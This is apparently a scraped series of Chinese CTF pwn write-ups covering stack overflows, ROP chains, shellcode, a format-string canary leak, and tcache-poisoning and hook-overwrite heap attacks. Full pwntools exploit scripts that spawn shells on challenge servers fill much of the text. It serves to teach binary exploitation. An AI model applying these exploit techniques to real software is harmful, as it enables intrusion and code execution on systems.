puts(\u0026#34;Welcome!\u0026#34;); puts(\u0026#34;Input your operation:\u0026#34;); puts(\u0026#34;1.Add a log.\u0026#34;); puts(\u0026#34;2.Display all logs.\u0026#34;); puts(\u0026#34;3.Print all logs.\u0026#34;); printf(\u0026#34;0.Exit\\n:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); switch ( v4 ) { case 0: exit(0); return result; case 1: AddLog(src); result = sub_804892B(argc, argv, envp); break; case 2: Display(src); result = sub_804892B(argc, argv, envp); break; case 3: Print(); result = sub_804892B(argc, argv, envp); break; case 4: GetFlag(src); result = sub_804892B(argc, argv, envp); break; default: result = sub_804892B(argc, argv, envp); break; } return result; } 首先我们找到了密码为administrator，然后我们看到下面的switch-case语句\n经过分析我们发现只有当case为1时能够输入128个字符：\n但是保存输入的变量不在当前栈中，而且在原本的main函数中传入的参数也只是一个保存地址的4字节变量，因此对原本的main函数也构成不了溢出。\n但是我们又发现，我们在src变量所指的内存中保存的数据会被别的函数利用：\n同时我们发现plt表中有system：\n$ readelf -r ciscn_2019_ne_5 重定位节 \u0026#39;.rel.dyn\u0026#39; at offset 0x3c4 contains 4 entries: 偏移量 信息 类型 符号值 符号名称 08049ff0 00000506 R_386_GLOB_DAT 00000000 stderr@GLIBC_2.0 08049ff4 00000906 R_386_GLOB_DAT 00000000 __gmon_start__ 08049ff8 00000c06 R_386_GLOB_DAT 00000000 stdin@GLIBC_2.0 08049ffc 00000d06 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 重定位节 \u0026#39;.rel.plt\u0026#39; at offset 0x3e4 contains 10 entries: 偏移量 信息 类型 符号值 符号名称 0804a00c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 0804a010 00000207 R_386_JUMP_SLOT 00000000 strcmp@GLIBC_2.0 0804a014 00000307 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 0804a018 00000407 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 0804a01c 00000607 R_386_JUMP_SLOT 00000000 strcpy@GLIBC_2.0 0804a020 00000707 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 0804a024 00000807 R_386_JUMP_SLOT 00000000 system@GLIBC_2.0 0804a028 00000a07 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 0804a02c 00000b07 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a030 00000e07 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 在这题中Display函数没有用，但是如果题目的plt表中system函数就可以通过Display函数泄露基址来ret2libc。\n这里我们看到我们输入的数据在GetFlag函数中会被strcpy保存在它栈中的一个变量中，这样我们就可以间接地栈溢出了\n构建exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_2019_ne_5\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;25151\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:libc_name}) m_elf = ELF(fn) bin_sh = 0x80482EA p.clean() p.sendline(b\u0026#34;administrator\u0026#34;) p.clean() p.sendline(b\u0026#34;1\u0026#34;) payload = b\u0026#34;a\u0026#34;*(0x48 + 0x4) + \\ pg(m_elf.plt[\u0026#39;system\u0026#39;]) \\ + pg(m_elf.plt[\u0026#39;exit\u0026#39;]) + pg(bin_sh) p.sendline(payload) p.clean() p.sendline(b\u0026#39;4\u0026#39;) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/ciscn_2019_ne_5/","section":"writeup","summary":"【Write-up】BUUCTF ciscn_2019_ne_5 原题链接 【Write-up】BUUCTF ciscn_2019_ne_5 checksec查看程序架构 ida查看程序伪代码 构建exp checksec","tags":["pwn"],"title":"BUUCTF ciscn_2019_ne_5"},{"categories":["writeup"],"contents":"【Write-up】BUUCTF Jarvisoj_level2_x64 原题链接\n【Write-up】BUUCTF Jarvisoj_level2_x64 checksec 查看架构 ida 查看伪代码 构建 exp 完整 exp checksec 查看架构 $ checksec --file level2_x64 [*] \u0026#39;/home/peterl/security/workspace/level2_x64/level2_x64\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 看来该程序是 64 位的，而且因为 NX 不能使用 shellcode\n同时，64 位系统调用 system 还要注意栈对齐的情况，要准备一个ret的 gadget\nida 查看伪代码 我们先运行一下康康：\n$ ./level2_x64 Input: Hello World! 看来有一个输入口，有机会栈溢出，我们用 ida 看看\n这个vulnerable_function属实是有点大摇大摆了\n点进去康康：\n这明摆着是要栈溢出然后调用 plt 表中的 system 函数\n构建 exp 寻找 system 函数地址：\n要注意的是，直接用readelf -r level2_x64命令读到的是.rela.plt 的符号表（涉及到延迟绑定机制，具体可以看这篇博文）\n寻找\u0026quot;\\bin\\sh\u0026quot;：\n$ ROPgadget --binary level2_x64 --string \u0026#34;/bin/sh\u0026#34; Strings information ============================================================ 0x0000000000600a90 : /bin/sh 还好有现成的，不用自己去构建了\n寻找两个 gadget：\n$ ROPgadget --binary level2_x64 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ 0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006b0 : pop r14 ; pop r15 ; ret 0x00000000004006b2 : pop r15 ; ret 0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret 0x0000000000400560 : pop rbp ; ret 0x00000000004006b3 : pop rdi ; ret 0x00000000004006b1 : pop rsi ; pop r15 ; ret 0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004004a1 : ret Unique gadgets found: 11 可以找到pop rdi;ret和ret：\n0x00000000004006b3 : pop rdi ; ret 0x00000000004004a1 : ret 然后我们就可以构建 exp 了\n注意，我们在一开始可以不加ret，试过一次如果出现 EOF 再加，如果加了还是报错就说明不是栈对齐的问题\n完整 exp from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./level2_x64\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34;}) ret = 0x4004a1 pop_rdi_ret = 0x4006b3 bin_sh = 0x600a90 system_addr = 0x4004c0 p.recvuntil(b\u0026#34;Input:\\n\u0026#34;) payload = b\u0026#34;a\u0026#34;*0x88 + pg(ret) + pg(pop_rdi_ret) + pg(bin_sh) + pg(system_addr) p.sendline(payload) p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/jarvisoj_level2_x64/","section":"writeup","summary":"【Write-up】BUUCTF Jarvisoj_level2_x64 原题链接 【Write-up】BUUCTF Jarvisoj_level2_x64 checksec 查看架构 ida 查看伪代码 构建 exp 完整 exp checksec 查看架构 $ checksec --file level2_x64 [*] \u0026#39;/home/peterl/security/workspace/level2_x64/level2_x64\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found","tags":["pwn"],"title":"BUUCTF Jarvisoj_level2_x64"},{"categories":["writeup"],"contents":"原题链接\nEasyEasyEasy 因为读入的是一个有符号数，所以当输入-1 的时候也是合法的\n而我们知道，-1%256 也是-1，而v5[-1]意为*(v5-1)，指向 v5 前面一个数，而该程序只将 v5 后面的 0x100 个数置零，所以前一个数仍可能为非零。\n事实证明确实如此，直接 nc 进去输入-1 即可\n简单的栈溢出 检查程序架构 查看 ida 反编译代码 限制一次输入得到 shell 权限\n思路一：爆破栈地址后四位 先写入 shellcode，然后要把 ret 值覆盖为 shellcode 地址即栈地址，但是限制一次输入，而且没有输出函数，无法泄露栈地址。 这时候在 ret 值的下面四项的位置保存了一个栈地址：\n但是这个值的倒数第三位和 shellocde 地址一定是不同的 所以我们尝试爆破栈地址末四位\n因为栈地址的最后一位是不变的，所以准确来说只用爆破三位 gets 会将输入的\\n 改为\\x00，所以 payload 只能覆盖到末二位，倒数三四位只能覆盖为\\x00\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40054F c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) pop_rdi_ret = 0x00000000004005e3 ret = 0x000000000040028d shellcode = asm(shellcraft.sh()) print(hex(len(shellcode))) payload = shellcode + b\u0026#34;\\x00\u0026#34;*(0x8) + pg(ret)*4 + p8(0x00) p.clean() p.sendline(payload) p.clean() p.sendline() try: p.recv(timeout=0.25) p.interactive() except: p.close() 思路二：利用jmp rax或call rax 我们把断点设在leave;ret上，gdb 过去会发现 rax 的值刚好是我们输入的字符串的地址\n那么我们就可以利用jmp rax或call rax跳转到 shellcode\n值得注意的是，这里如果使用 pwntools 生成的 shellcode，因为有七个 push，所以 rsp 会上移，而 shellcode 也是存在栈上的，这时就会覆盖一部分 shellcode\n解决办法有两个：\n使用更短的 shellcode shellcode = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; 在跳转到 shellcode 前使 rsp 下移 payload = shellcode.ljust(0x38, b\u0026#34;a\u0026#34;) + pg(ret)*0x5 + pg(call_rax) 完整 exp：\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) # while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40054F c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) ret = 0x000000000040028d jmp_rax = 0x0000000000400485 call_rax = 0x000000000040051e shellcode = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; shellcode = asm(shellcraft.amd64.linux.sh()) print(disasm(shellcode)) print(hex(len(shellcode))) payload = shellcode.ljust(0x38, b\u0026#34;a\u0026#34;) + pg(ret)*0x5 + pg(call_rax) p.clean() p.sendline(payload) p.clean() p.interactive() babyrop 此题需要的 libc 版本只能用 ubuntu22 查看程序架构：\n查看 ida 反编译代码：\n有沙箱把 execve 的系统调用给禁了（：谢谢你\n基本思路就是在栈上保存\u0026quot;./flag\\x00\\x00\u0026quot;字符串，然后通过 open、read、write 的系统调用读到 flag\n主要难点是获得./flag 字符串的栈地址（本题 bss 段长度不够，存不了 flag 字符串）\n要点是用mov rdi, rsp; add rdi, 0x40指向 payload 末尾，在末尾保存 flag 字符串\n然后调用依次调用 0x2、0x0、0x1 号系统调用（open、read、write）\n所有的系统调用编号在此\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./baby_rop\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libseccomp.so.2\u0026#34; port: str = \u0026#34;10076\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) # while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40131C c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) pop_rdi_ret = 0x0000000000401207 pop_rdx_ret = 0x000000000040120d mov_rsi_rdi_ret = 0x000000000040120f pop_rax_syscall_ret = 0x0000000000401213 ret = 0x000000000040101a read_addr = 0x4012CF gift = 0x00000000004011fb leave_ret = 0x000000000040131c add_rdi_40_ret = 0x00000000004011fe mov_rdi_rsp_ret = 0x0000000000401203 p.clean() payload = \\ b\u0026#34;./flag\\x00\\x00\u0026#34;*0x7 + \\ pg(pop_rdi_ret) + pg(0) + pg(mov_rsi_rdi_ret) +\\ pg(mov_rdi_rsp_ret) + pg(add_rdi_40_ret)*2 +\\ pg(pop_rax_syscall_ret) + pg(0x2) +\\ pg(mov_rsi_rdi_ret) +\\ pg(pop_rdi_ret) + pg(3) +\\ pg(pop_rdx_ret) + pg(0xff)+\\ pg(pop_rax_syscall_ret) + pg(0x0) +\\ pg(pop_rdi_ret) + pg(1) +\\ pg(pop_rax_syscall_ret) + pg(0x1) + pg(0) + b\u0026#34;./flag\\x00\\x00\u0026#34; p.sendline(payload) try: p.interactive() except: p.close() FLAG：flag{6fU9jIyTmarX2EMwJHvQY7SpLuqVbzAN}\nCTF 查看架构：\n有 canary 查看 ida 反编译代码：\n这题有点寄的是没有 main 函数，只有一个 label1 作为程序入口，所以只能看汇编代码，好在不是很复杂：\n大致的逻辑是要经过两个挑战：\n第一个挑战是经典的速算挑战，用 python 的 eval 函数解析读入的计算式就可以了\n第二个挑战是要利用符号位漏洞，我们输入 0x800000000000000c 即可\n这里要注意的是，我们不能直接用 python 输出这个数，因为 python 会自动解析为很大的无符号数。比较简单的方法是使用 Windows 自带的计算器：\n还有另外一种方法是调用ctypes库，创建long long int类型的变量：\noverflow = ctypes.c_longlong(0x800000000000000c) # p.sendline(\u0026#34;-9223372036854775796\u0026#34;) p.sendline(str(overflow.value)) 通过第二个挑战后我们就可以开始第三个挑战。第三个挑战是格式化字符串漏洞用于泄露 canary，然后就是一个栈溢出。\n需要注意的是，64 位系统中的格式化字符串的前五个参数分别存在寄存器 RSI/RDX/RCX/R8/R9 中\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher from ctypes import c_longlong as longlong pss: bool = True fn: str = \u0026#34;./CTF\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10074\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x173B) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) p.recvuntil(b\u0026#34;and tell you a secret \u0026#34;) getshell = int(p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1], 16) codebase = getshell - m_elf.sym[\u0026#39;getshell\u0026#39;] for i in range(50): p.recvuntil(b\u0026#34;num1:\u0026#34;) num1 = p.recvuntil(b\u0026#34;,num2:\u0026#34;)[:-6] num2 = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] p.recvuntil(b\u0026#34;operator:\u0026#34;) oper = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] if b\u0026#34;/\u0026#34; in oper: oper = b\u0026#34;//\u0026#34; answer = eval(num1 + oper + num2) p.clean() p.sendline(str(answer)) p.recvuntil(b\u0026#34;Great Job!\\n\u0026#34;) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) overflow = ctypes.c_longlong(0x800000000000000c) # p.sendline(\u0026#34;-9223372036854775796\u0026#34;) p.sendline(str(overflow.value)) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) p.sendline(str(1)) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) p.sendline(b\u0026#34;%25$p.\u0026#34;) p.recvuntil(b\u0026#34;0x\u0026#34;) canary = int(p.recvuntil(b\u0026#34;.\u0026#34;)[:-1], 16) for i in range(2): p.recvuntil(b\u0026#34;...\u0026#34;) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) payload = b\u0026#34;a\u0026#34;*0x88 + pg(canary) + pg(0) + pg(getshell) p.sendline(payload) p.recvuntil(\u0026#34;Quickly, you are surrounded.\\n\\n\u0026#34;) p.clean() p.interactive() FLAG：flag{114514_V_me_F1fty}\nsignin 法一：free 大 chunk 绕过 tcache bin，然后 tcache poison 检查架构：\n查看 ida 伪代码：\n认真分析一下就会发现还是经典的堆菜单题\n先 free 掉一个很大的 chunk，这样这个 chunk 就会直接进入 unsorted bin（这个临界值我在自己的 64 位机器上测试，大概是 0x409），然后减去 main_arena+96，就可以得到 libc 的基址\n关于这个 main_arena+96 哪里来的，首先将 libc 拖入 ida，搜索 malloc_trim：\nmain_arena 的偏移就是 0x3ebc40\n然后我们使用 gdb 手动 free 一个大 chunk，查看内存\n这里 pwndbg 可以用 bins 命令，但我的 bins 和 heap 出现问题寄了，这里演示一下手动计算 unsorted bin 中只有一个 chunk 时存储的值和 main_arena 的偏移为何为 96\n0x00007ffff7dcdca0-0x7ffff79e2000-0x3ebc40=96\n使用计算器会快很多\n然后我们 free 掉一个小 chunk，让他进入 tcache bin，我们就能更改它的 next 位，从而可以实现任意地址写\n这样我们就可以更改__malloc_hook 的值为 one_gadget 了\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./signin\u0026#34; libc_name:str = \u0026#34;./libc-2.27.so\u0026#34; port: str = \u0026#34;10071\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ENV = {\u0026#34;LD_PRELOAD\u0026#34;:libc_name} context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x400904 \u0026#34;\u0026#34;\u0026#34;, env=ENV) else: p = process(fn, env=ENV) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) main_arena = 0x3EBC40 main_off = 96 chunks = 0x6020f0 # malloc的index不能直接控制 def allocate(size: int): p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(size)) # free的标签小于七 # 一共只能free两次 def free(index: int): p.clean() p.sendline(b\u0026#34;2\u0026#34;) p.clean() p.sendline(str(index)) def change(index: int, data: str): p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(data) def show(index: int): p.clean() p.sendline(b\u0026#34;4\u0026#34;) p.clean() p.sendline(str(index)) p.recvuntil(b\u0026#34;content: \u0026#34;) return p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] allocate(0x1000) # 1 allocate(0x80) allocate(0x80) free(0) libcbase = u64(show(0)[:9].ljust(0x8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + main_off) success(f\u0026#34;libcbase =\u0026gt; {hex(libcbase)}\u0026#34;) system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] malloc_hook_addr = libcbase + libc.sym[\u0026#39;__malloc_hook\u0026#39;] one_gadget = libcbase + 0x10a2fc next_chunk = 0x23 free(1) payload = pg(malloc_hook_addr - next_chunk) change(1, payload) allocate(0x80) allocate(0x7f) # gdb.attach(p) payload = b\u0026#34;0\u0026#34;*0x23 + pg(one_gadget) change(4, payload) allocate(0x10) p.clean() p.interactive() FLAG：flag{cd02sdyy9hfggsyo1wecd8ad2elttilnaj22}\n法二：通过stderr泄露libc，然后更改chunks指针 这个方法的要点在于，因为使用了setbuf函数，所以stdin、stdout、stderr会以全局变量的形式存在程序中。 我们可以通过tcache poisoning来将这个chunk分配到这个地方，然后因为程序中保存所有分配空间的指针chunks也是全局变量，所以这个chunk也可以更改chunks的值，这样子就可以将其指向__malloc_hook，这样子就能够将它的值改为one_gadget了\n这个方法有一个问题，就是分配在stderr处的chunk会将count置零，这是因为分配的位置刚好让count在它的bk位，而malloc会将bk置零： ^962996\n且看下面这个程序：\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main(void){ int *a = (int *)malloc(0x80); int *b = (int *)malloc(0x80); free(a); a[2] = 1; a = (int *)malloc(0x80); printf(\u0026#34;%d\\n\u0026#34;, a[2]); } 结果是0：\n若将a[2]改为a[1]，则结果为1：\n说明至少对tcache bin中的chunk来说，bk会被置零而fd不会\n虽然这可能会随着libc版本的改变而改变，但是如果我们做题的时候发现bk被置零了，至少我们多了一种可考虑的可能\nfrom pwn import * path = \u0026#34;/home/linux/0/pwn/signin\u0026#34; stderr = 0x6020A0 context(log_level = \u0026#34;debug\u0026#34;, arch = \u0026#34;amd64\u0026#34;, os = \u0026#34;linux\u0026#34;) #p = process(path) #p = gdb.debug(path, \u0026#34;b *(main+0xC1)\u0026#34;) p = remote(\u0026#34;43.248.98.206\u0026#34;, \u0026#34;10071\u0026#34;) def add(size): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;1\u0026#34;)\tp.sendlineafter(\u0026#34;size: \u0026#34;, str(size)) def edit(index, content): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) p.sendlineafter(\u0026#34;data: \u0026#34;, content) def display(index): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;4\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) def free(index): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;2\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) add(0x80) #0 add(0x80) #1 free(0) free(1) edit(1, p64(stderr)) #tcache poisoning add(0x80) #2 add(0x80) #0 0x6020A0 When mallocing chunk on 0x6020A0, the \u0026#34;idx\u0026#34; on .bss will change into 0. Actually I don\u0026#39;t know why. But the index of this chunk is 0. display(0) #leak libc p.recvuntil(\u0026#34;content: \u0026#34;) libc = int.from_bytes(p.recv(6), \u0026#34;little\u0026#34;) - 0x3EC680 print(\u0026#34;libc =\u0026#34;, hex(libc)) malloc_hook = libc + 0x3EBC30 print(\u0026#34;malloc_hook =\u0026#34;, hex(malloc_hook)) one_gadget = [libc + 0x4f302, libc + 0x10a2fc] edit(0, flat(0, 0, 0, 0, malloc_hook, 0x80)) #change the pointer save in chunks[0] into malloc_hook edit(0, flat(one_gadget[1])) #write one gadget add(0xA0) #trigger malloc_hook p.interactive() 法三：更改chance后将__free_hook改为system地址，在chunk内填入/bin/sh后free掉 libc-2.27.so释放符合大小的堆块会进入tcachebin中\n但是因为chance的限制，程序规定只能释放两次堆块，但利用tcachebin的特性可以改变释放次数\n改变后可以通过先释放大堆块进入unsortedbin，利用它的特性和UAF带出main_arena，然后通过固定偏移可以算出libc基地址\n再释放两次堆块进入tcache bin，改变链首部的堆块的fd指向__free_hook，再申请两个同样大小的堆块，再将__free_hook里的值改为system的，最后通过释放\u0026quot;/bin/sh\u0026quot;的堆块即可实现system('/bin/sh')，还有个地方得注意，只能打印8个堆块的内容，所以申请堆块的数量要把控好\nfrom pwn import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) #p=process(\u0026#39;signin\u0026#39;) libc=ELF(\u0026#39;libc-2.27.so\u0026#39;) p=remote(\u0026#39;43.248.98.206\u0026#39;,10071) elf=ELF(\u0026#39;signin\u0026#39;) def add(size): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;size: \u0026#39;,str(size)) def free(index): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) def xiugai(index,data): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;3\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) p.sendafter(\u0026#39;data: \u0026#39;,data) def pri(index): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;4\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) add(16) add(16) free(0) free(1) payload=p64(0x602070) xiugai(1,payload) add(16) add(16) xiugai(3,b\u0026#39;100\u0026#39;) # 增加chance次数 add(0x500) # 进入unsortedbin add(16) # 防止与top_chunk相连 free(4) pri(4) # 带出main_arena地址 p.recvuntil(\u0026#39;content: \u0026#39;) libc_addr=u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;))-0x3ebca0 success(\u0026#39;libc:\u0026#39;+hex(libc_addr)) #gdb.attach(p) free(0) free(2) xiugai(2,p64(libc.symbols[\u0026#39;__free_hook\u0026#39;]+libc_addr)) add(16) add(16) xiugai(7,p64(libc.symbols[\u0026#39;system\u0026#39;]+libc_addr)) xiugai(6,b\u0026#39;/bin/sh\\x00\u0026#39;) free(6) #gdb.attach(p) p.interactive() LearnHeap 查看程序架构 查看ida反编译代码 int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int ch_0; // [rsp+8h] [rbp-18h] BYREF int i; // [rsp+Ch] [rbp-14h] char *p; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); init(); p = (char *)malloc(0x20uLL); puts(\u0026#34;Welcome to LearnHeap!\u0026#34;); puts(\u0026#34;This is a guided learning test.\u0026#34;); puts(\u0026#34;In this test, gdb and pwndbg may help you.\u0026#34;); puts(byte_176B); puts(\u0026#34;Now you will see a very regular heap question. add() show() delete()\u0026#34;); puts(\u0026#34;Step 1. Leak Libc address.\\nStep 2. double free.\\nStep 3. hijacking __free_hook\\nStep 4. get shell!\u0026#34;); puts(\u0026#34;Now, let\u0026#39;s start!\u0026#34;); Step1(); Step2(); Step3(); Step4(); *free_hook = 0LL; memset(p - 592, 0, 0x240uLL); for ( i = 67; i; --i ) malloc(0x10uLL); memset(book, 0, sizeof(book)); puts(\u0026#34;Now Let\u0026#39;s attack.\u0026#34;); while ( 1 ) { puts(\u0026#34;Welcome~!\\n1.add\\n2.show\\n3.delete\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;ch_0); switch ( ch_0 ) { case 2: show(); break; case 3: delete(); break; case 1: add(); break; default: puts(\u0026#34;error.\u0026#34;); break; } } } step1 泄露libc基址 这里调用了add和delete函数： 因此我们编写的add和delete函数:\ndef add(index: int, size: int, content, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(size)) p.clean() p.sendline(content) def delete(index: int, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) 然后我们分配一个大chunk进入unsorted bin，这样它的fd指针会被设为main_arena+96，从而我们可以获得libc基址\n需要注意的是，虽然没有show函数，但是在add函数的最后会将输入的内容puts出来\n又因为malloc会首先从各个bin中寻找合适的chunk，所以我们第三次add的时候会分配到进入unsorted bin中的那个大chunk（或它的一部分），而malloc不会将内容清零（至少fd指针不清零，详情见此）\n所以，最后我们puts出来的，就是main_arena+96的指针\n注意，libc2.26没有tcache bin，所以注意想要进入fastbin的chunk大小（默认最大大小为(64 * SIZE_SZ / 4)，32 位为 64=0x40 字节，64 位为 128=0x80 字节）\nadd(0, 1071, b\u0026#34;\u0026#34;) # 大于1072会退出，但是1033就可以进入unsorted bin add(1, 0x10, b\u0026#34;\u0026#34;) delete(0) add(2, 0x10, b\u0026#34;\u0026#34;) p.recvuntil(b\u0026#34;Your book: \\n\u0026#34;) 